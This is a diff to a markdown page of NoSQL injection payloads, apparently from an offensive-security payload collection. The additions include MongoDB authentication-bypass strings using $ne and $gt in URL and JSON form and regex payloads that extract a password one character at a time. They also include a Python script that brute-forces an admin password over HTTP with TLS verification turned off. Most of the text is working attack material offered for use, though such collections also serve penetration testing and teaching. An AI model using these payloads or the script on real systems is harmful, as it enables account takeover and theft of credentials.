@@ -3,9 +3,16 @@ NoSQL databases provide looser consistency restrictions than traditional SQL dat
 
 ## Exploit
 
-Basic authentication bypass using not equal ($ne)
+Basic authentication bypass using not equal ($ne) or greater ($gt)
 ```
+in URL
 username[$ne]=toto&password[$ne]=toto
+
+in JSON
+{"username": {"$ne": null}, "password": {"$ne": null} }
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
+{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
+
 ```
 
 Extract length information
@@ -16,12 +23,39 @@ username[$ne]=toto&password[$regex]=.{3}
 
 Extract data information
 ```
+in URL
 username[$ne]=toto&password[$regex]=m.{2}
 username[$ne]=toto&password[$regex]=md.{1}
 username[$ne]=toto&password[$regex]=mdp
 
 username[$ne]=toto&password[$regex]=m.*
 username[$ne]=toto&password[$regex]=md.*
+
+in JSON
+{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
+{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
+```
+
+## Blind NoSQL
+```python
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username="admin"
+password=""
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|']:
+            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
+            r = requests.post(u, data = {'ids': payload}, verify = False)
+            if 'OK' in r.text:
+                print("Found one more char : %s" % (password+c))
+                password += c
 ```
 
 ## MongoDB Payloads
@@ -47,6 +81,7 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 
 
 ## Thanks to
-* https://www.dailysecurity.fr/nosql-injections-classique-blind/
-* https://www.owasp.org/index.php/Testing_for_NoSQL_injection
-* https://github.com/cr0hn/nosqlinjection_wordlists
+ * https://www.dailysecurity.fr/nosql-injections-classique-blind/
+ * https://www.owasp.org/index.php/Testing_for_NoSQL_injection
+ * https://github.com/cr0hn/nosqlinjection_wordlists
+ * https://zanon.io/posts/nosql-injection-in-mongodb
